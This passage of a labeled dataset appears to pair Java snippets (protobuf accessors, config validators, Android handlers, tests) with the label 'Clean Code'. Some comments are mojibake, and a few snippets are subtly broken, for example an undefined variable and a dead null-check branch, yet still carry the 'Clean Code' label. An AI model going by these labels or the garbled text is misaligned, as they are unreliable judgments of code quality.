  }
  final Set<Node> endSuccSet=new HashSet<Node>();
  final NodeList[] nodeListsEndSucc=Bfs.getLayers(graph.getGraph(),endNodes,Bfs.DIRECTION_SUCCESSOR,graph.getGraph().createNodeMap(),0);
  for (  final NodeList nodeList : nodeListsEndSucc) {
    endSuccSet.addAll(nodeList);
  }
  final SetView<Node> endBeforeStartSetView=Sets.intersection(startPredSet,endSuccSet);
  if (!endBeforeStartSetView.isEmpty()) {
    for (    final Node node : endBeforeStartSetView) {
      graph.getGraph().setSelected(node,true);
    }
  }
}",0,Clean Code
"public void start(){
  thread=new Thread(this);
  thread.start();
}
",0,Clean Code
"@WorkerThread private void generateApkChecksumsAndFetchScanReports(){
  waitForFile();
  Path file=Paths.getUnprivileged(mApkFile);
  String pithusReportUrl=null;
  Pair<String,String>[] digests=ExUtils.exceptionAsNull(() -> DigestUtils.getDigests(file));
  mApkChecksumsLiveData.postValue(digests);
  if (digests != null && FeatureController.isInternetEnabled()) {
    String sha256=digests[2].second;
    pithusReportUrl=ExUtils.exceptionAsNull(() -> Pithus.resolveReport(sha256));
  }
  mPithusReportLiveData.postValue(pithusReportUrl);
  if (mVt != null && digests != null && FeatureController.isVirusTotalEnabled()) {
    String md5=digests[0].second;
    try {
      mVt.fetchReportsOrScan(file,md5,this);
    }
 catch (    IOException e) {
      e.printStackTrace();
      mVtFileReportLiveData.postValue(null);
    }
  }
 else   mVtFileReportLiveData.postValue(null);
}",0,Clean Code
"private void processTransfer(Context context,Invoke callSite,TaintTransfer transfer){
  IndexRef from=transfer.from();
  IndexRef to=transfer.to();
  Var toVar=InvokeUtils.getVar(callSite,to.index());
  if (toVar == null) {
    return;
  }
  Var fromVar=InvokeUtils.getVar(callSite,from.index());
  CSVar csFrom=csManager.getCSVar(context,fromVar);
  CSVar csTo=csManager.getCSVar(context,toVar);
  if (from.kind() == IndexRef.Kind.VAR) {
    Kind kind=null;
    if (kind != null) {
      TransferInfo info=new TransferInfo(kind,fromVar,transfer);
      transferInfos.put(toVar,info);
      transferTaint(solver.getPointsToSetOf(csTo),context,info);
    }
  }
 else   if (to.kind() == IndexRef.Kind.VAR) {
    Kind kind=null;
    TransferInfo info=new TransferInfo(kind,toVar,transfer);
    transferInfos.put(fromVar,info);
    transferTaint(solver.getPointsToSetOf(csFrom),context,info);
  }
 else {
    logger.warn(""TaintTransfer {} -> {} (in {}) is not supported"",transfer,from.kind(),to.kind());
  }
  if (enableBackPropagate && to.index() != InvokeUtils.RESULT && to.kind() == IndexRef.Kind.VAR && !(to.index() == InvokeUtils.BASE && transfer.method().isConstructor())) {
    backPropagateTaint(toVar,context);
  }
}
",0,Clean Code
"/** 
 * Set the node above this one in the k-d tree.
 * @param node The node being added to the tree.
 */
void setAbove(DimensionNode node){
  if (node == null) {
    this.above=null;
  }
 else   if ((this.dimension + 1 == node.dimension) || (this.dimension == maxD && node.dimension == 0)) {
    this.above=node;
  }
 else {
    throw new IllegalArgumentException(""Setting the above/right node failed because the dimensions are incorrect."");
  }
}",0,Clean Code
"/** 
 * Used by the OLCUT configuration system, and should not be called by external code.
 */
@Override public void postConfig() throws IOException {
  if (maxFeatureID != Integer.MIN_VALUE) {
    rangeSet=true;
    minFeatureID=zeroIndexed ? 0 : 1;
    if (maxFeatureID < minFeatureID + 1) {
      throw new IllegalArgumentException(""maxFeatureID must be positive, found "" + maxFeatureID);
    }
  }
  if ((url == null) && (path == null)) {
    throw new PropertyException("""",""path"",""At most one of url and path must be set."");
  }
 else   if ((url != null) && (path != null) && !path.toUri().toURL().equals(url)) {
    throw new PropertyException("""",""path"",""At most one of url and path must be set"");
  }
 else   if (path != null) {
    try {
      url=path.toUri().toURL();
    }
 catch (    MalformedURLException e) {
      throw new PropertyException(e,"""",""path"",""Path was not a valid URL"");
    }
  }
  read();
}",0,Clean Code
"@Override public boolean onHover(View v,MotionEvent event){
  if (mPopup != null && mFromTouch) {
    return false;
  }
  AccessibilityManager manager=(AccessibilityManager)mAnchor.getContext().getSystemService(Context.ACCESSIBILITY_SERVICE);
  if (manager.isEnabled() && manager.isTouchExplorationEnabled()) {
    return false;
  }
switch (event.getAction()) {
case MotionEvent.ACTION_HOVER_MOVE:
    if (mAnchor.isEnabled() && mPopup == null && updateAnchorPos(event)) {
      setPendingHandler(this);
    }
  break;
case MotionEvent.ACTION_HOVER_EXIT:
clearAnchorPos();
hide();
break;
}
return false;
}
",0,Clean Code
"public Delta build(){
  return new Delta(this);
}
",0,Clean Code
"public RunIterationsNode(VmLanguage language,FrameDescriptor descriptor,ExpressionNode iterationNode){
  super(language,descriptor);
  this.blackholeNode=BlackholeNodeGen.create(iterationNode);
}
",0,Clean Code
"@Test public void testSetrange(){
  jedisSentinel.setrange(""key"",1337,""value"");
}",0,Clean Code
"public Builder retrievalAugmentor(RetrievalAugmentor retrievalAugmentor){
  this.retrievalAugmentor=retrievalAugmentor;
  return this;
}
",0,Clean Code
"public GProRolePermissionDesc(){
  this.title="""";
  this.desc="""";
}
public GProRolePermissionDesc(int i2,String str,String str2){
  this.title="""";
  this.desc="""";
  this.rootId=i2;
  this.title=str;
  this.desc=str2;
}",0,Clean Code
"@Override public void writeExternal(ObjectOutput out) throws IOException {
  throw new RuntimeException();
}
",0,Clean Code
"/** 
 * Runs a comparison between an onnx model and a Tribuo model. <p> Only runs on x86 platforms.
 * @param model The Tribuo model.
 * @param onnxFile The path on disk to the ONNX model.
 * @param testSet The test set.
 * @param delta The delta allowable between the Tribuo and ORT predictions.
 * @throws OrtException If ORT failed to initialize.
 */
public static void onnxLabelComparison(Model<Label> model,Path onnxFile,Dataset<Label> testSet,double delta) throws OrtException {
  Map<String,Integer> featureMapping=new HashMap<>();
  for (  VariableInfo f : model.getFeatureIDMap()) {
    VariableIDInfo id=(VariableIDInfo)f;
    featureMapping.put(id.getName(),id.getID());
  }
  Map<Label,Integer> outputMapping=new HashMap<>();
  for (  Pair<Integer,Label> l : model.getOutputIDInfo()) {
    outputMapping.put(l.getB(),l.getA());
  }
  String arch=System.getProperty(""os.arch"");
  String os=System.getProperty(""os.name"").toLowerCase(Locale.ENGLISH);
  if (arch.equalsIgnoreCase(""amd64"") || arch.equalsIgnoreCase(""x86_64"") || (arch.equalsIgnoreCase(""aarch64"") && (os.contains(""mac"") || os.contains(""nux"")))) {
    OrtEnvironment env=OrtEnvironment.getEnvironment();
    env.close();
    ONNXExternalModel<Label> onnxModel=ONNXExternalModel.createOnnxModel(new LabelFactory(),featureMapping,outputMapping,new DenseTransformer(),new LabelTransformer(),new OrtSession.SessionOptions(),onnxFile,""input"");
    List<Prediction<Label>> nativePredictions=model.predict(testSet);
    List<Prediction<Label>> onnxPredictions=onnxModel.predict(testSet);
    for (int i=0; i < nativePredictions.size(); i++) {
      Prediction<Label> tribuo=nativePredictions.get(i);
      Prediction<Label> external=onnxPredictions.get(i);
      assertEquals(tribuo.getOutput().getLabel(),external.getOutput().getLabel());
      assertEquals(tribuo.getOutput().getScore(),external.getOutput().getScore(),delta);
      for (      Map.Entry<String,Label> l : tribuo.getOutputScores().entrySet()) {
        Label other=external.getOutputScores().get(l.getKey());
        if (other == null) {
          fail(""Failed to find label "" + l.getKey() + "" in ORT prediction."");
        }
 else {
          assertEquals(l.getValue().getScore(),other.getScore(),delta);
        }
      }
    }
    ModelProvenance modelProv=model.getProvenance();
    Optional<ModelProvenance> optProv=onnxModel.getTribuoProvenance();
    assertTrue(optProv.isPresent());
    ModelProvenance onnxProv=optProv.get();
    assertNotSame(onnxProv,modelProv);
    assertEquals(modelProv,onnxProv);
    onnxModel.close();
  }
 else {
    logger.warning(""ORT based tests only supported on x86_64, found "" + arch);
  }
}",0,Clean Code
"public String getDesc(){
  return this.mInfo.getDesc();
}
",0,Clean Code
"public static ActivateFarmElementCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new ActivateFarmElementCsReq(),data).checkInitialized();
}
public static ActivateFarmElementCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ActivateFarmElementCsReq(),input).checkInitialized();
}
public static ActivateFarmElementCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ActivateFarmElementCsReq(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * <code>optional uint32 cur_site_id = 11;</code>
 * @return this
 */
public RogueMapInfo clearCurSiteId(){
  bitField0_&=~0x00000004;
  curSiteId=0;
  return this;
}",0,Clean Code
"@GET(""models"") @Headers({""Content-Type: application/json""}) Call<MistralAiModelResponse> models();
",0,Clean Code
"/** 
 * <code>optional uint32 relic_id = 11;</code>
 * @return this
 */
public RelicArchive clearRelicId(){
  bitField0_&=~0x00000001;
  relicId=0;
  return this;
}",0,Clean Code
"@Override public void tail(@NonNull Node node,int depth){
  if (node instanceof Element) {
    if (""span"".equals(el.nodeName()) && el.hasClass(""ellipsis"")) {
      ssb.append(""鈥�"",new DeleteWhenCopiedSpan(),Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
    }
 else     if (""p"".equals(el.nodeName())) {
      if (node.nextSibling() != null)       ssb.append(""\n\n"");
    }
 else     if (!openSpans.isEmpty()) {
      SpanInfo si=openSpans.get(openSpans.size() - 1);
      if (si.element == el) {
        ssb.setSpan(si.span,si.start,ssb.length(),Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
        openSpans.remove(openSpans.size() - 1);
      }
    }
  }
}
@Override public void tail(Node node,int depth){
  if (node instanceof Element && ""p"".equals(el.tagName()) && el.nextSibling() != null) {
    sb.append(""\n\n"");
  }
}",0,Clean Code
"/** 
 * 鍒楄〃
 */
@RequestMapping(value=""/categories"",method=RequestMethod.GET) @ApiOperation(value=""鍟嗗搧鍒嗙被鍒楄〃"",notes=""鏍规嵁绾у埆鍜屼笂绾у垎绫籭d鏌ヨ"") public Result list(@RequestParam(required=false) @ApiParam(value=""椤电爜"") Integer pageNumber,@RequestParam(required=false) @ApiParam(value=""姣忛〉鏉℃暟"") Integer pageSize,@RequestParam(required=false) @ApiParam(value=""鍒嗙被绾у埆"") Integer categoryLevel,@RequestParam(required=false) @ApiParam(value=""涓婄骇鍒嗙被鐨刬d"") Long parentId,@TokenToAdminUser AdminUserToken adminUser){
  logger.info(""adminUser:{}"",adminUser.toString());
  if (pageNumber == null || pageNumber < 1 || pageSize == null || pageSize < 10 || categoryLevel == null || categoryLevel < 0 || categoryLevel > 3 || parentId == null || parentId < 0) {
    return ResultGenerator.genFailResult(""鍒嗛〉鍙傛暟寮傚父锛"");
  }
  Map params=new HashMap(8);
  params.put(""page"",pageNumber);
  params.put(""limit"",pageSize);
  params.put(""categoryLevel"",categoryLevel);
  params.put(""parentId"",parentId);
  PageQueryUtil pageUtil=new PageQueryUtil(params);
  return ResultGenerator.genSuccessResult(newBeeMallCategoryService.getCategorisPage(pageUtil));
}",0,Clean Code
"@ParameterizedTest @ValueSource(strings={""{\""arg0\"": 2, \""arg1\"": 2}"",""{\""arg0\"": 2.0, \""arg1\"": 2.0}"",""{\""arg0\"": 1.9, \""arg1\"": 2.1}""}) void should_execute_tool_with_parameters_of_type_double(String arguments) throws NoSuchMethodException {
  executeAndAssert(arguments,""doubles"",double.class,Double.class,""4.0"");
}",0,Clean Code
"@Override public Row buildRow(Row reuse,String mandatoryEncoding) throws BitSailException {
  if (this.getDelimiter() != null && this.getDelimiter().length == 1 && this.getDelimiter()[0] == NEW_LINE && currOffset + currLen >= 1 && currBuffer[currOffset + currLen - 1] == CARRIAGE_RETURN) {
    currLen-=1;
  }
  try {
    reuse=bytesParser.parse(reuse,currBuffer,currOffset,currLen,charsetName,rowTypeInfo);
  }
 catch (  Exception e) {
    LOG.error(""Parse one line error!"",e);
    throw BitSailException.asBitSailException(TextInputFormatErrorCode.ILLEGAL_JSON,e);
  }
  return reuse;
}",0,Clean Code
"public CooperateUser(String i,String n){
  id=i;
  name=n;
}
",0,Clean Code
"private void save() throws IOException {
  final BinDiffConfig config=BinDiffConfig.getInstance();
  final GraphViewSettingsConfigItem settings=config.getInitialFlowGraphSettings();
  settings.setDefaultGraphLayout(layoutingPanel.getDefaultLayout());
  settings.setAutoLayouting(layoutingPanel.getAutoLayouting());
  settings.setProximityBrowsing(proximityBrowsingPanel.getProximityBrowsing());
  settings.setAutoProximityBrowsingActivationThreshold(proximityBrowsingPanel.getAutoProximityBrowsingActivationThreshold());
  settings.setProximityBrowsingChildDepth(proximityBrowsingPanel.getProximityBrowsingChildDepth());
  settings.setProximityBrowsingParentDepth(proximityBrowsingPanel.getProximityBrowsingParentDepth());
  settings.setDrawBends(edgesPanel.getDrawBends());
  settings.setHierarchicalOrthogonalEdgeRouting(hierarchicalLayoutPanel.getOrthogonalEdgeRouting());
  settings.setHierarchicalOrientation(hierarchicalLayoutPanel.getLayoutOrientation());
  settings.setHierarchicalMinimumLayerDistance(hierarchicalLayoutPanel.getMinimumLayerDistance());
  settings.setHierarchicalMinimumNodeDistance(hierarchicalLayoutPanel.getMinimumNodeDistance());
  settings.setOrthogonalLayoutStyle(orthogonalLayoutPanel.getOrthogonalLayoutStyle());
  settings.setOrthogonalOrientation(orthogonalLayoutPanel.getOrthogonalOrientation());
  settings.setOrthogonalMinimumNodeDistance(orthogonalLayoutPanel.getMinimumNodeDistance());
  settings.setCircularLayoutStyle(circularLayoutPanel.getCircularLayoutStyle());
  settings.setCircularMinimumNodeDistance(circularLayoutPanel.getMinimumNodeDistance());
  settings.setShowScrollbars(controlsPanel.getShowScrollbars());
  settings.setMouseWheelAction(controlsPanel.getMouseWheelBehavior());
  settings.setZoomSensitivity(controlsPanel.getZoomSensitivity());
  settings.setScrollSensitivity(controlsPanel.getScrollSensitivity());
  settings.setViewSynchronization(miscPanel.getViewSynchronization());
  settings.setAnimationSpeed(miscPanel.getAnimationSpeed());
  config.write();
}
",0,Clean Code
"public InlineTaskMapper(ParametersUtils parametersUtils,MetadataDAO metadataDAO){
  this.parametersUtils=parametersUtils;
  this.metadataDAO=metadataDAO;
}
",0,Clean Code
"@Override public void postConfig(){
  boolean bothFieldNamesPopulated=fieldName != null && fieldNames != null;
  boolean neitherFieldNamesPopulated=fieldName == null && fieldNames == null;
  boolean multipleFieldNamesPopulated=fieldNames != null;
  boolean singleFieldNamePopulated=fieldName != null;
  boolean bothDefaultValuesPopulated=defaultValues != null && defaultValue != null;
  boolean neitherDefaultValuesPopulated=defaultValue == null && defaultValues == null;
  boolean multipleDefaultValuesPopulated=defaultValues != null;
  boolean singleDefaultValuePopulated=defaultValue != null;
  if (bothFieldNamesPopulated || neitherFieldNamesPopulated) {
    throw new PropertyException(configName,""fieldName, FieldNames"",""exactly one of fieldName or fieldNames must be populated"");
  }
 else   if (bothDefaultValuesPopulated || neitherDefaultValuesPopulated) {
    throw new PropertyException(configName,""defaultValue, defaultValues"",""exactly one of defaultValue or defaultValues must be populated"");
  }
 else   if (multipleFieldNamesPopulated && multipleDefaultValuesPopulated && fieldNames.size() != defaultValues.size()) {
    throw new PropertyException(configName,""defaultValues"",""must match the length of fieldNames"");
  }
 else   if (multipleFieldNamesPopulated && singleDefaultValuePopulated) {
    defaultValues=Collections.nCopies(fieldNames.size(),defaultValue);
    defaultValue=null;
  }
 else   if (singleFieldNamePopulated && multipleDefaultValuesPopulated) {
    throw new PropertyException(configName,""defaultValues"",""if fieldName is populated, defaultValues must be blank"");
  }
 else   if (singleFieldNamePopulated && singleDefaultValuePopulated) {
    fieldNames=Collections.singletonList(fieldName);
    fieldName=null;
    defaultValues=Collections.singletonList(defaultValue);
    defaultValue=null;
  }
}
",0,Clean Code
"/** 
 * 鍒嗛〉鏌ヨ鎵撳嵃妯℃澘鍒楄〃
 * @param templateBO search
 * @return data
 */
BasePage<ModulePrintTemplate> queryPrintTemplateList(Long moduleId,Integer version,PageEntity templateBO);
",0,Clean Code
"public int getStreamType(){
  return this.mInfo.getStreamType();
}
",0,Clean Code
"@Override public Long calculateNextTriggerTime(Long preTriggerTime,String timeExpression,Long startTime,Long endTime){
  Cron cron=cronParser.parse(timeExpression);
  ExecutionTime executionTime=ExecutionTime.forCron(cron);
  if (startTime != null && startTime > System.currentTimeMillis() && preTriggerTime < startTime) {
    Optional<ZonedDateTime> zonedDateTime=executionTime.lastExecution(ZonedDateTime.ofInstant(Instant.ofEpochMilli(startTime),ZoneId.systemDefault()));
    preTriggerTime=zonedDateTime.map(dateTime -> dateTime.toEpochSecond() * 1000).orElse(startTime);
  }
  Instant instant=Instant.ofEpochMilli(preTriggerTime);
  ZonedDateTime preZonedDateTime=ZonedDateTime.ofInstant(instant,ZoneId.systemDefault());
  Optional<ZonedDateTime> opt=executionTime.nextExecution(preZonedDateTime);
  if (opt.isPresent()) {
    long nextTriggerTime=opt.get().toEpochSecond() * 1000;
    if (endTime != null && endTime < nextTriggerTime) {
      return null;
    }
    return nextTriggerTime;
  }
  return null;
}",0,Clean Code
"/** 
 * NOTE: Pos gathered from content block data may slightly exceed video duration (e.g. 302200 when duration is 302000).
 */
@Override public void setPositionMs(long positionMs){
  if (mPlayer != null && positionMs >= 0 && positionMs <= getDurationMs()) {
    mPlayer.seekTo(positionMs);
  }
}",0,Clean Code
"/** 
 * For olcut.
 */
private ImageConverter(){
}
/** 
 * Builds an image converter for images of the supplied size.
 * @param inputName The input name.
 * @param width The image width.
 * @param height The image height.
 * @param channels The number of colour channels.
 */
public ImageConverter(String inputName,int width,int height,int channels){
  if (width < 1 || height < 1 || channels < 1) {
    throw new IllegalArgumentException(""Inputs must be positive integers, found ["" + width + "",""+ height+ "",""+ channels+ ""]"");
  }
  if (inputName == null || inputName.isEmpty()) {
    throw new IllegalArgumentException(""The input name must be a valid String"");
  }
  long values=((long)width) * height * channels;
  if (values > Integer.MAX_VALUE) {
    throw new IllegalArgumentException(""Image size must be less than 2^31, found "" + values);
  }
  this.inputName=inputName;
  this.totalPixels=(int)values;
  this.width=width;
  this.height=height;
  this.channels=channels;
}",0,Clean Code
"/** 
 * @return a converter that maps between this enum's numeric and text representations
 */
public static ProtoEnum.EnumConverter<BattleEndReason> converter(){
  return BattleEndReasonConverter.INSTANCE;
}
",0,Clean Code
"@Override public int hashCode(){
  return Objects.hash(fieldName);
}
",0,Clean Code
"public b e(String str){
  this.f227614c=str;
  return this;
}",0,Clean Code
"/** 
 * Creates a resolved module key backed by the given URL. The resulting module will be loaded from that URL and cached using the given URI as cache key.
 */
public static ResolvedModuleKey url(ModuleKey original,URI uri,URL url){
  return new Url(original,uri,url);
}
Url(ModuleKey original,URI uri,URL url){
  this.original=original;
  this.uri=uri;
  this.url=url;
}
",0,Clean Code
"public AppController addWalletTabOrWindow(Storage storage,Wallet wallet,boolean forceSameWindow){
  Window existingWalletWindow=AppServices.get().getWindowForWallet(storage.getWalletId(wallet));
  if (existingWalletWindow instanceof Stage) {
    Stage existingWalletStage=(Stage)existingWalletWindow;
    existingWalletStage.toFront();
    EventManager.get().post(new ViewWalletEvent(existingWalletWindow,wallet,storage));
    return this;
  }
  if (!forceSameWindow && Config.get().isOpenWalletsInNewWindows() && !getOpenWallets().isEmpty()) {
    Stage stage=new Stage();
    AppController appController=AppServices.newAppWindow(stage);
    stage.toFront();
    stage.setX(AppServices.get().getWalletWindowMaxX() + 30);
    appController.addWalletTab(storage,wallet);
    return appController;
  }
 else {
    addWalletTab(storage,wallet);
    return this;
  }
}",0,Clean Code
"private ListResult<ExecuteResult> reBuildHeader(List<ExecuteResult> results,String schemaName,String databaseName){
  ListResult<ExecuteResult> listResult=ListResult.of(results);
  for (  ExecuteResult executeResult : results) {
    List<Header> headers=executeResult.getHeaderList();
    if (executeResult.getSuccess() && executeResult.isCanEdit() && CollectionUtils.isNotEmpty(headers)) {
      headers=setColumnInfo(headers,executeResult.getTableName(),schemaName,databaseName);
      executeResult.setHeaderList(headers);
    }
    if (!executeResult.getSuccess()) {
      listResult.setSuccess(false);
      listResult.errorCode(executeResult.getDescription());
      listResult.setErrorMessage(executeResult.getMessage());
    }
    addOperationLog(executeResult);
  }
  return listResult;
}
",0,Clean Code
"/** 
 * 鏄惁鏄暟瀛楁垨鑰呯壒娈婂瓧绗�
 * @param lastIndexNamePart
 * @return
 */
public static boolean isNumbericOrSpecialChar(String lastIndexNamePart){
  for (int i=0; i < lastIndexNamePart.length(); ++i) {
    char c=lastIndexNamePart.charAt(i);
    if (Character.isDigit(c) || c == '-' || c == '_') {
      continue;
    }
 else {
      return false;
    }
  }
  return true;
}",0,Clean Code
"private void setType(int type){
  selectedTextType=type;
  if (currentEntityView instanceof TextPaintView) {
    Swatch currentSwatch=colorPicker.getSwatch();
    if (type == 0 && currentSwatch.color == Color.WHITE) {
      Swatch blackSwatch=new Swatch(Color.BLACK,0.85f,currentSwatch.brushWeight);
      setCurrentSwatch(blackSwatch,true);
    }
 else     if ((type == 1 || type == 2) && currentSwatch.color == Color.BLACK) {
      Swatch blackSwatch=new Swatch(Color.WHITE,1.0f,currentSwatch.brushWeight);
      setCurrentSwatch(blackSwatch,true);
    }
    ((TextPaintView)currentEntityView).setType(type);
  }
}",0,Clean Code
"@Override public void scrollToPosition(int position){
  mPositionBeforeScroll=getCurrentPosition();
  mSmoothScrollTargetPosition=position;
  super.scrollToPosition(position);
  if (mSmoothScrollTargetPosition >= 0 && mSmoothScrollTargetPosition < getItemCount() && mSmoothScrollTargetPosition != mPositionBeforeScroll && mOnPageChangedListener != null) {
    getViewTreeObserver().addOnGlobalLayoutListener(mGlobalLayoutListener);
  }
}",0,Clean Code
"/** 
 * private method 
 */
private void collectMetrics(Long clusterPhyId,String topicName,Map<Integer,PartitionMetrics> metricsMap,List<VersionControlItem> items){
  Set<String> collectedMetricsNameSet=new HashSet<>();
  for (  VersionControlItem v : items) {
    try {
      if (collectedMetricsNameSet.contains(v.getName())) {
        continue;
      }
      collectedMetricsNameSet.add(v.getName());
      Result<List<PartitionMetrics>> ret=partitionMetricService.collectPartitionsMetricsFromKafkaWithCache(clusterPhyId,topicName,v.getName());
      if (null == ret || ret.failed() || null == ret.getData() || ret.getData().isEmpty()) {
        continue;
      }
      collectedMetricsNameSet.addAll(ret.getData().get(0).getMetrics().keySet());
      for (      PartitionMetrics subMetrics : ret.getData()) {
        metricsMap.putIfAbsent(subMetrics.getPartitionId(),subMetrics);
        PartitionMetrics allMetrics=metricsMap.get(subMetrics.getPartitionId());
        allMetrics.putMetric(subMetrics.getMetrics());
      }
    }
 catch (    Exception e) {
      LOGGER.info(""method=collectMetrics||clusterPhyId={}||topicName={}||metricName={}||errMsg=exception"",clusterPhyId,topicName,v.getName(),e);
    }
  }
}",0,Clean Code
"@SuppressWarnings(""TryWithIdenticalCatches"") public static void registerOnActivityDestroyListener(Preference preference,PreferenceManager.OnActivityDestroyListener listener){
  if (null == mRegisterOnActivityDestroyListener || null == preference || null == listener) {
    return;
  }
  PreferenceManager preferenceManager=preference.getPreferenceManager();
  if (null == preferenceManager) {
    return;
  }
  try {
    mRegisterOnActivityDestroyListener.invoke(preferenceManager,listener);
  }
 catch (  IllegalAccessException e) {
    e.printStackTrace();
  }
catch (  InvocationTargetException e) {
    e.printStackTrace();
  }
}
",0,Clean Code
"private static void addInheritedClassFields(J.ClassDeclaration classDeclaration,@Nullable JavaType.FullyQualified superClass,Set<String> names){
  if (superClass != null) {
    boolean isSamePackage=classDeclaration.getType() != null && classDeclaration.getType().getPackageName().equals(superClass.getPackageName());
    superClass.getMembers().forEach(m -> {
      if ((Flag.hasFlags(m.getFlagsBitMap(),Flag.Public) || Flag.hasFlags(m.getFlagsBitMap(),Flag.Protected)) || !Flag.hasFlags(m.getFlagsBitMap(),Flag.Private) && isSamePackage) {
        names.add(m.getName());
      }
    }
);
    addInheritedClassFields(classDeclaration,superClass.getSupertype(),names);
  }
}
",0,Clean Code
"@Override public Object read(MemoryBuffer buffer){
  long offset=this.offset;
  if (offset == -1) {
    Preconditions.checkArgument(!GraalvmSupport.isGraalBuildtime());
    offset=this.offset=Platform.UNSAFE.staticFieldOffset(field);
    base=Platform.UNSAFE.staticFieldBase(field);
  }
  return Platform.getObject(base,offset);
}",0,Clean Code
"/** 
 * Return true if a class satisfy following requirements. <li>implements  {@link Serializable}<li>is not an  {@link Enum}<li>is not an array <li>Doesn't have  {@code readResolve}/ {@code writePlace} method<li>has  {@code readObject}/ {@code writeObject} method, but doesn't implements {@link Externalizable}<li/>
 */
public static boolean requireJavaSerialization(Class<?> clz){
  if (clz.isEnum() || clz.isArray()) {
    return false;
  }
  if (ReflectionUtils.isDynamicGeneratedCLass(clz)) {
    return false;
  }
  if (!Serializable.class.isAssignableFrom(clz)) {
    return false;
  }
  if (useReplaceResolveSerializer(clz)) {
    return false;
  }
  if (Externalizable.class.isAssignableFrom(clz)) {
    return false;
  }
 else {
    if (""sun.reflect.annotation.AnnotationInvocationHandler"".equals(clz.getName())) {
      return false;
    }
    return JavaSerializer.getReadObjectMethod(clz) != null || JavaSerializer.getWriteObjectMethod(clz) != null;
  }
}
",0,Clean Code
"@NotNull Flow<ArrayList<ContactMsgBoxInfo>> contactMsgBoxChangedFlow();
",0,Clean Code
"@Override public int hashCode(){
  return editor.hashCode();
}
@Override public int hashCode(){
  return urlScheme.hashCode();
}
",0,Clean Code
"@Override @TruffleBoundary public void describe(StringBuilder builder,String indent){
  describeSummary(builder,indent);
  describeDetails(builder,indent);
}
",0,Clean Code
"public int getExpireTs(){
  return this.expireTs;
}
",0,Clean Code
"/** 
 * <code>repeated .RogueDialogueEventParam rogue_dialogue_event_param = 9;</code>
 * @return whether the rogueDialogueEventParam field is set
 */
public boolean hasRogueDialogueEventParam(){
  return (bitField0_ & 0x00000020) != 0;
}",0,Clean Code
"private Result<ConnectClusterMetrics> getConnectWorkerMetricAvg(VersionItemParam metricParam){
  ConnectClusterMetricParam param=(ConnectClusterMetricParam)metricParam;
  Long connectClusterId=param.getConnectClusterId();
  String metric=param.getMetric();
  Result<List<ConnectWorkerMetrics>> ret=this.getConnectWorkerMetricsByJMX(connectClusterId,metric);
  if (ret == null || !ret.hasData() || ret.getData().isEmpty()) {
    return Result.buildFailure(NOT_EXIST);
  }
  Float value=ret.getData().stream().map(elem -> elem.getMetric(metric) == null ? 0 : elem.getMetric(metric)).reduce(Float::sum).get();
  ConnectClusterMetrics connectClusterMetrics=new ConnectClusterMetrics(null,connectClusterId);
  connectClusterMetrics.putMetric(metric,value / ret.getData().size());
  return Result.buildSuc(connectClusterMetrics);
}",0,Clean Code
"private List<TableIndexColumn> getTableIndexColumn(ResultSet resultSet) throws SQLException {
  List<TableIndexColumn> tableIndexColumns=new ArrayList<>();
  String name=StringUtils.isBlank(resultSet.getString(""column_name"")) ? resultSet.getString(""expression"") : resultSet.getString(""column_name"");
  if (StringUtils.isNotBlank(name)) {
    String[] split=name.split("","");
    for (    String columName : split) {
      TableIndexColumn tableIndexColumn=new TableIndexColumn();
      tableIndexColumn.setColumnName(columName);
      tableIndexColumn.setOrdinalPosition(resultSet.getShort(""seq_in_index""));
      tableIndexColumn.setCollation(resultSet.getString(""collation""));
      tableIndexColumn.setCardinality(resultSet.getLong(""cardinality""));
      tableIndexColumn.setSubPart(resultSet.getLong(""sub_part""));
      tableIndexColumns.add(tableIndexColumn);
    }
  }
  return tableIndexColumns;
}
",0,Clean Code
"/** 
 * <code>optional uint32 attacked_group_id = 8;</code>
 * @return this
 */
public SceneCastSkillCsReq clearAttackedGroupId(){
  bitField0_&=~0x00000004;
  attackedGroupId=0;
  return this;
}",0,Clean Code
"@Override public LockEquipmentCsReq create(){
  return LockEquipmentCsReq.newInstance();
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof ChessRogueCell)) {
    return false;
  }
  ChessRogueCell other=(ChessRogueCell)o;
  return bitField0_ == other.bitField0_ && (!hasEntranceId() || entranceId == other.entranceId) && (!hasNNMNHHPJBDB() || nNMNHHPJBDB == other.nNMNHHPJBDB) && (!hasNLBGDNLIONI() || nLBGDNLIONI == other.nLBGDNLIONI) && (!hasFOKKJJADPEA() || fOKKJJADPEA == other.fOKKJJADPEA) && (!hasPNKFAINKKCE() || pNKFAINKKCE == other.pNKFAINKKCE) && (!hasCellId() || cellId == other.cellId) && (!hasJLOBGDKNJLN() || jLOBGDKNJLN == other.jLOBGDKNJLN) && (!hasNewRoomId() || newRoomId == other.newRoomId) && (!hasPMBLMGDFGAN() || pMBLMGDFGAN == other.pMBLMGDFGAN) && (!hasIsUnlocked() || isUnlocked == other.isUnlocked) && (!hasIIJOCONHKND() || iIJOCONHKND.equals(other.iIJOCONHKND));
}",0,Clean Code
"public void recalculateSizes(){
  for (  Pass pass : passes) {
    if (pass instanceof ComputeOnlyPass) {
      continue;
    }
    int passWidth=0, passHeight=0;
    for (    int buffer : pass.drawBuffers) {
      RenderTarget target=renderTargets.get(buffer);
      if ((passWidth > 0 && passWidth != target.getWidth()) || (passHeight > 0 && passHeight != target.getHeight())) {
        throw new IllegalStateException(""Pass widths must match"");
      }
      passWidth=target.getWidth();
      passHeight=target.getHeight();
    }
    renderTargets.destroyFramebuffer(pass.framebuffer);
    pass.framebuffer=renderTargets.createColorFramebuffer(pass.stageReadsFromAlt,pass.drawBuffers);
    pass.viewWidth=passWidth;
    pass.viewHeight=passHeight;
  }
}",0,Clean Code
"public static int getEndOfHTTPHeaders(byte[] buf){
  for (int i=0; i <= (buf.length - 4); i++) {
    if ((buf[i] == '\r') && (buf[i + 1] == '\n') && (buf[i + 2] == '\r')&& (buf[i + 3] == '\n'))     return i + 4;
  }
  return 0;
}",0,Clean Code
"private static boolean hasFixedSize(int type){
